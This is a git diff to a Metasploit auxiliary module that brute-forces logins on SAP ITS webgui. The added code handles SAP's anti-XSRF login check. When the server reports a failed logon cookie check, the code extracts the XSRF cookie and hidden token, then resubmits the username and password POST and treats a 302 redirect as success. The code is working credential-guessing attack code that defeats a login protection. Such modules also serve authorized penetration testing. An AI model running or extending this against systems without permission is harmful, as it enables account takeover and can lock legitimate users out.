@@ -36,7 +36,8 @@ class MetasploitModule < Msf::Auxiliary
         ],
       'Author' =>
         [
-          'nmonkee'
+          'nmonkee',
+          'murphy'
         ],
       'License' => MSF_LICENSE
 
@@ -134,6 +135,8 @@ class MetasploitModule < Msf::Auxiliary
   def bruteforce(uri,user,pass,cli)
     begin
       path = "sap/bc/gui/sap/its/webgui/"
+         
+
       cookie = "Active=true; sap-usercontext=sap-language=EN&sap-client=#{cli}"
       res = send_request_cgi({
         'uri'    => "#{uri}#{path}",
@@ -183,6 +186,36 @@ class MetasploitModule < Msf::Auxiliary
       elsif res.body =~ /Password logon no longer possible - too many failed attempts/
         print_error("[SAP] #{rhost}:#{rport} - #{user} locked in client #{cli}")
         return false
+      elsif res.body =~ /Logon&#x20;cookie&#x20;check&#x20;failed&#x3b;&#x20;repeat&#x20;logon/ or res.body =~ /logon&#x20;cookie&#x20;is&#x20;missing/
+        xsrf_cookie = res.headers['set-cookie'].match(/sap-login-XSRF_([a-zA-Z0-9]+)=(.*);/)
+        xsrf_field = res.body.match(/<input type="hidden" name="sap-login-XSRF" value="(.*)">/)
+        sid = xsrf_cookie[1]
+        xsrf_cookie_value=xsrf_cookie[2]
+        xsrf_field_value = xsrf_field[1].sub(/&#x3d;/,"=")
+        cookie = "sap-login-XSRF_#{sid}=#{xsrf_cookie_value};Active=true; sap-usercontext=sap-language=EN&sap-client=#{cli}"
+        res = send_request_cgi({
+        'uri'    => "#{uri}#{path}",
+        'method' => 'POST',
+        'cookie' => cookie,
+        'vars_post' => {
+          'sap-system-login-oninputprocessing' => 'onLogin',
+          'sap-urlscheme' => '',
+          'sap-system-login' => 'onLogin',
+          'sap-system-login-basic_auth' => '',
+          'sap-system-login-cookie_disabled' => '',
+          'sysid' => '',
+          'sap-client' => cli,
+          'sap-user' => user,
+          'sap-password' => pass,
+          'sap-language' => 'EN',
+          'sap-login-XSRF' => xsrf_field_value
+          }
+        })
+        if res.code == 302
+          return true
+        else
+          return false
+        end
       end
     else
       print_error("[SAP] #{rhost}:#{rport} - error trying #{user}/#{pass} against client #{cli}")
